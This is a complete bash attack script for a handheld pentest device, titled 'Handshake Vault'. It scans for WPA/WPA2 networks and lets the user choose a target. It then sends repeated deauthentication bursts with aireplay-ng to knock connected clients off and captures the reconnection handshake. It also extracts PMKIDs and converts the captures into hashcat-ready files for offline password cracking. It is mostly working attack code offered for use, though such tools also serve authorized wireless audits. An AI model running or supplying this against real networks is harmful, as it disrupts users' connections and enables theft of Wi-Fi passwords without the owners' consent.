#!/bin/bash
# Title: Handshake Vault
# Author: bad-antics
# Description: Capture, organize, and manage WPA handshake files
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/handshakes"
mkdir -p "$LOOT_DIR"

PROMPT "HANDSHAKE VAULT

Capture, organize, and manage
WPA/WPA2 handshake files.

Features:
- Targeted handshake capture
- Auto-deauth for acceleration
- PMKID extraction attempt
- Handshake verification
- Organized vault storage
- Hashcat-ready conversion
- Capture history tracking

Press OK to configure."

# Monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!\nRun: airmon-ng start wlan1"; exit 1; }

# Mode selection
resp=$(CONFIRMATION_DIALOG "CAPTURE MODE

YES = Targeted capture
(scan and pick a specific AP)

NO = Browse existing vault

Press OK for new capture.")
if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    # --- VAULT BROWSER MODE ---
    VAULT_LIST=""
    CAP_COUNT=0
    for cap_file in "$LOOT_DIR"/*.cap "$LOOT_DIR"/*.pcap "$LOOT_DIR"/*.hccapx 2>/dev/null; do
        [ ! -f "$cap_file" ] && continue
        CAP_COUNT=$((CAP_COUNT + 1))
        fname=$(basename "$cap_file")
        fsize=$(du -h "$cap_file" 2>/dev/null | awk '{print $1}')
        fdate=$(stat -c '%y' "$cap_file" 2>/dev/null | cut -d' ' -f1)
        VAULT_LIST="${VAULT_LIST}${CAP_COUNT}) ${fname} (${fsize}, ${fdate})\n"
    done

    if [ $CAP_COUNT -eq 0 ]; then
        PROMPT "VAULT EMPTY

No handshake files found.
Run a new capture first.

Vault: $LOOT_DIR"
    else
        PROMPT "HANDSHAKE VAULT

$CAP_COUNT capture files:

$(echo -e "$VAULT_LIST")

Vault: $LOOT_DIR"
    fi
    exit 0
fi

# --- CAPTURE MODE ---
SPINNER_START "Scanning for targets..."

SCAN_FILE="/tmp/hv_scan"
rm -f "${SCAN_FILE}"*.csv 2>/dev/null
timeout 15 airodump-ng "$MONITOR_IF" -w "$SCAN_FILE" --output-format csv 2>/dev/null

SPINNER_STOP

# Build target list with clients
TARGET_LIST=""
TARGET_COUNT=0
declare -a T_BSSID T_ESSID T_CH T_ENC T_CLIENTS

while IFS=',' read -r bssid first last channel speed privacy cipher auth power beacons iv lan_ip id_len essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    essid=$(echo "$essid" | sed 's/^ *//;s/ *$//')
    channel=$(echo "$channel" | tr -d ' ')
    privacy=$(echo "$privacy" | tr -d ' ')
    power=$(echo "$power" | tr -d ' ')

    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ -z "$power" ] || [ "$power" = "-1" ] && continue
    # Only WPA/WPA2 targets
    [[ ! "$privacy" =~ WPA ]] && continue

    [ -z "$essid" ] && essid="<hidden>"

    # Count connected clients for this AP
    CLIENTS=$(grep -c "$bssid" "${SCAN_FILE}-01.csv" 2>/dev/null || echo 0)
    CLIENTS=$((CLIENTS - 1))  # subtract the AP line itself
    [ $CLIENTS -lt 0 ] && CLIENTS=0

    TARGET_COUNT=$((TARGET_COUNT + 1))
    T_BSSID[$TARGET_COUNT]="$bssid"
    T_ESSID[$TARGET_COUNT]="$essid"
    T_CH[$TARGET_COUNT]="$channel"
    T_ENC[$TARGET_COUNT]="$privacy"
    T_CLIENTS[$TARGET_COUNT]="$CLIENTS"
    TARGET_LIST="${TARGET_LIST}${TARGET_COUNT}) ${essid} Ch:${channel} ${privacy} Clients:${CLIENTS}\n"
done < "${SCAN_FILE}-01.csv" 2>/dev/null

[ $TARGET_COUNT -eq 0 ] && { ERROR_DIALOG "No WPA networks found!"; exit 1; }

TARGET_NUM=$(NUMBER_PICKER "Target (1-$TARGET_COUNT):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac

[ $TARGET_NUM -lt 1 ] || [ $TARGET_NUM -gt $TARGET_COUNT ] && { ERROR_DIALOG "Invalid selection!"; exit 1; }

SEL_BSSID="${T_BSSID[$TARGET_NUM]}"
SEL_ESSID="${T_ESSID[$TARGET_NUM]}"
SEL_CH="${T_CH[$TARGET_NUM]}"
SEL_CLIENTS="${T_CLIENTS[$TARGET_NUM]}"

# Capture timeout
TIMEOUT=$(NUMBER_PICKER "Capture timeout (sec):" 120)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMEOUT=120 ;; esac

# Deauth option
resp=$(CONFIRMATION_DIALOG "USE DEAUTH?

Sending deauth forces clients
to reconnect, producing the
handshake faster.

Connected clients: $SEL_CLIENTS

Press OK to enable deauth.")
if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    USE_DEAUTH=1
else
    USE_DEAUTH=0
fi

TIMESTAMP=$(date +%Y%m%d_%H%M)
SAFE_ESSID=$(echo "$SEL_ESSID" | tr -cd 'A-Za-z0-9_-')
[ -z "$SAFE_ESSID" ] && SAFE_ESSID="hidden"
CAP_FILE="$LOOT_DIR/${SAFE_ESSID}_${TIMESTAMP}"

resp=$(CONFIRMATION_DIALOG "START CAPTURE?

Target: $SEL_ESSID
BSSID: $SEL_BSSID
Channel: $SEL_CH
Clients: $SEL_CLIENTS
Deauth: $([ $USE_DEAUTH -eq 1 ] && echo YES || echo NO)
Timeout: ${TIMEOUT}s

Press OK to capture.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Capturing handshake..."

LOG "Targeting $SEL_ESSID on ch $SEL_CH..."

# Set channel
iwconfig "$MONITOR_IF" channel "$SEL_CH" 2>/dev/null

# Start capture in background
airodump-ng "$MONITOR_IF" -c "$SEL_CH" --bssid "$SEL_BSSID" -w "$CAP_FILE" --output-format pcap 2>/dev/null &
DUMP_PID=$!

# Send deauth if enabled
if [ $USE_DEAUTH -eq 1 ] && [ $SEL_CLIENTS -gt 0 ]; then
    sleep 3
    LOG "Sending deauth burst..."
    aireplay-ng -0 5 -a "$SEL_BSSID" "$MONITOR_IF" > /dev/null 2>&1
    sleep 5
    aireplay-ng -0 5 -a "$SEL_BSSID" "$MONITOR_IF" > /dev/null 2>&1
fi

# Wait for handshake or timeout
ELAPSED=0
CAPTURED=0
while [ $ELAPSED -lt $TIMEOUT ]; do
    sleep 5
    ELAPSED=$((ELAPSED + 5))
    LOG "Waiting... ${ELAPSED}/${TIMEOUT}s"

    # Check if handshake captured
    for f in "${CAP_FILE}"*.cap "${CAP_FILE}"*.pcap; do
        [ ! -f "$f" ] && continue
        if aircrack-ng "$f" 2>/dev/null | grep -q "1 handshake"; then
            CAPTURED=1
            FINAL_CAP="$f"
            break 2
        fi
    done

    # Periodic deauth
    if [ $USE_DEAUTH -eq 1 ] && [ $((ELAPSED % 30)) -eq 0 ]; then
        aireplay-ng -0 3 -a "$SEL_BSSID" "$MONITOR_IF" > /dev/null 2>&1
    fi
done

kill $DUMP_PID 2>/dev/null
killall airodump-ng aireplay-ng 2>/dev/null

# Try PMKID extraction
PMKID_FILE="$LOOT_DIR/${SAFE_ESSID}_${TIMESTAMP}.pmkid"
PMKID_FOUND=0
for f in "${CAP_FILE}"*.cap "${CAP_FILE}"*.pcap; do
    [ ! -f "$f" ] && continue
    if command -v hcxpcapngtool > /dev/null 2>&1; then
        hcxpcapngtool -o "$PMKID_FILE" "$f" 2>/dev/null
        [ -s "$PMKID_FILE" ] && PMKID_FOUND=1
    fi
done

# Convert to hashcat format if possible
HCCAPX_FILE="$LOOT_DIR/${SAFE_ESSID}_${TIMESTAMP}.hccapx"
if [ $CAPTURED -eq 1 ] && command -v cap2hccapx > /dev/null 2>&1; then
    cap2hccapx "$FINAL_CAP" "$HCCAPX_FILE" 2>/dev/null
fi

# Write vault index entry
echo "${TIMESTAMP}|${SEL_ESSID}|${SEL_BSSID}|${SEL_CH}|captured=${CAPTURED}|pmkid=${PMKID_FOUND}" >> "$LOOT_DIR/vault_index.log"

SPINNER_STOP

if [ $CAPTURED -eq 1 ]; then
    PROMPT "HANDSHAKE CAPTURED!

Target: $SEL_ESSID
BSSID: $SEL_BSSID
Time: ${ELAPSED}s

Files:
  Cap: ${FINAL_CAP}
  $([ -f "$HCCAPX_FILE" ] && echo "Hashcat: $HCCAPX_FILE")
  $([ $PMKID_FOUND -eq 1 ] && echo "PMKID: $PMKID_FILE")

Vault: $LOOT_DIR"
else
    PROMPT "CAPTURE TIMEOUT

Target: $SEL_ESSID
No handshake after ${TIMEOUT}s.

$([ $PMKID_FOUND -eq 1 ] && echo "PMKID extracted: $PMKID_FILE" || echo "No PMKID found either.")

Tips:
- Try longer timeout
- Ensure clients connected
- Move closer to AP

Vault: $LOOT_DIR"
fi
